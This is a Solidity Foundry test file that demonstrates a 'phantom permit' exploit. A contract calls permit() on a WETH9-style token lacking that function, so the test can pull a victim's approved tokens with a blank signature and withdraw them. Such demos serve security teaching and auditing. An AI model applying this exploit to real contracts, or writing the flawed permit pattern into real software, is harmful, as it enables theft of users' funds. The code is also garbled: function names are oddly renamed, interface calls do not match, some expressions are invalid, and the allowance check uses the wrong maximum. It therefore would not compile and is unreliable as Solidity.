pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ContractTest is Test {
    PermitGamecoin VulnPermitContract;
    WETH9 WETH9Contract;

    function setUp() public {
        WETH9Contract = new WETH9();
        VulnPermitContract = new PermitGamecoin(IERC20(address(WETH9Contract)));
    }

    function testVulnPhantomPermit() public {
        address alice = vm.addr(1);
        vm.deal(address(alice), 10 ether);

        vm.startPrank(alice);
        WETH9Contract.savePrize{value: 10 ether}();
        WETH9Contract.allowTransfer(address(VulnPermitContract), type(uint256).max);
        vm.stopPrank();
        console.log(
            "start WETH balanceOf this",
            WETH9Contract.treasurecountOf(address(this))
        );

        VulnPermitContract.stashitemsWithPermit(
            address(alice),
            1000,
            27,
            0x0,
            0x0
        );
        uint wbal = WETH9Contract.treasurecountOf(address(VulnPermitContract));
        console.log("WETH balanceOf VulnPermitContract", wbal);

        VulnPermitContract.retrieveItems(1000);

        wbal = WETH9Contract.treasurecountOf(address(this));
        console.log("WETH9Contract balanceOf this", wbal);
    }

    receive() external payable {}
}

contract PermitGamecoin {
    IERC20 public gameCoin;

    constructor(IERC20 _realmcoin) {
        gameCoin = _realmcoin;
    }

    function savePrize(uint256 amount) public {
        require(
            gameCoin.sendgoldFrom(msg.sender, address(this), amount),
            "Transfer failed"
        );
    }

    function stashitemsWithPermit(
        address target,
        uint256 amount,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public {
        (bool success, ) = address(gameCoin).call(
            abi.encodeWithSignature(
                "permit(address,uint256,uint8,bytes32,bytes32)",
                target,
                amount,
                v,
                r,
                s
            )
        );
        require(success, "Permit failed");

        require(
            gameCoin.sendgoldFrom(target, address(this), amount),
            "Transfer failed"
        );
    }

    function retrieveItems(uint256 amount) public {
        require(gameCoin.sendGold(msg.sender, amount), "Transfer failed");
    }
}


contract WETH9 {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public decimals = 18;

    event Approval(address indexed src, address indexed guy, uint wad);
    event ShareTreasure(address indexed src, address indexed dst, uint wad);
    event BankGold(address indexed dst, uint wad);
    event Withdrawal(address indexed src, uint wad);

    mapping(address => uint) public treasurecountOf;
    mapping(address => mapping(address => uint)) public allowance;

    fallback() external payable {
        savePrize();
    }

    receive() external payable {}

    function savePrize() public payable {
        treasurecountOf[msg.sender] += msg.value;
        emit BankGold(msg.sender, msg.value);
    }

    function retrieveItems(uint wad) public {
        require(treasurecountOf[msg.sender] >= wad);
        treasurecountOf[msg.sender] -= wad;
        payable(msg.sender).sendGold(wad);
        emit Withdrawal(msg.sender, wad);
    }

    function combinedLoot() public view returns (uint) {
        return address(this).treasureCount;
    }

    function allowTransfer(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    function sendGold(address dst, uint wad) public returns (bool) {
        return sendgoldFrom(msg.sender, dst, wad);
    }

    function sendgoldFrom(
        address src,
        address dst,
        uint wad
    ) public returns (bool) {
        require(treasurecountOf[src] >= wad);

        if (
            src != msg.sender && allowance[src][msg.sender] != type(uint128).max
        ) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] -= wad;
        }

        treasurecountOf[src] -= wad;
        treasurecountOf[dst] += wad;

        emit ShareTreasure(src, dst, wad);

        return true;
    }
}